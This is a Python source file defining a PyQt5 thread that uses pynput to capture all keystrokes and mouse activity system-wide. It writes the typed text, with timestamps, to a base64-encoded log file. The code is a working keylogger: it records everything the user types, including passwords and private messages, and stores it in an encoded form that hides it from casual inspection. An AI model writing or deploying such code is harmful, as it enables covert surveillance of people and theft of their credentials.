import time, os, base64
from PyQt5.QtCore import QThread
from pynput import keyboard, mouse

from ..utils import path

class KeyBoardThread(QThread):
    enterFlag = False

    def __init__(self):
        super(KeyBoardThread, self).__init__()
        self.logContent = ""
    
    def forceStop(self):
        try:
            try:
                content = ""
                if os.path.exists(path.path(self.fileName)):
                    with open(path.path(self.fileName), "r", encoding="utf-8") as f1:
                        content += base64.b64decode(f1.read()).decode("utf-8")
                content += self.logContent
                with open(path.path(self.fileName), "w", encoding="utf-8") as f2:
                    f2.write(base64.b64encode(bytes(content, "utf-8")).decode("utf-8"))
                self.logContent = ""
            except Exception as e:
                print(e)
            self.keyboardListener.stop()
            self.mouseListener.stop()
        except Exception:
            del self.keyboardListener
            del self.mouseListener
    
    def on_press(self, key):
        try:
            char = key.char
            if char:
                print(f"{char} Pressed.")
                self.logContent += char
        except AttributeError:
            print(f"{key} Pressed.")
            self.logContent += f"[{str(key).replace('Key.', '')}]"
        if not self.enterFlag:
            self.enterFlag = True
    
    def on_mouse(self, x, y, dx=None, dy=None):
        print("Mouse move", x, y, dx, dy)
        if self.enterFlag:
            self.logContent += "\n"
            self.enterFlag = False

    def run(self):
        now = time.localtime()
        time_str = time.strftime("%Y-%m-%d %H:%M:%S", now)
        self.logContent += f"\n\n({time_str}):\n"

        self.mouseListener = mouse.Listener(
            on_move=self.on_mouse,
            on_click=self.on_mouse,
            on_scroll=self.on_mouse)
        self.mouseListener.start()

        self.keyboardListener = keyboard.Listener(
                on_press=self.on_press)
        self.keyboardListener.start()
        self.keyboardListener.join()
        try:
            self.keyboardListener.stop()
            self.mouseListener.stop()
        except Exception:
            pass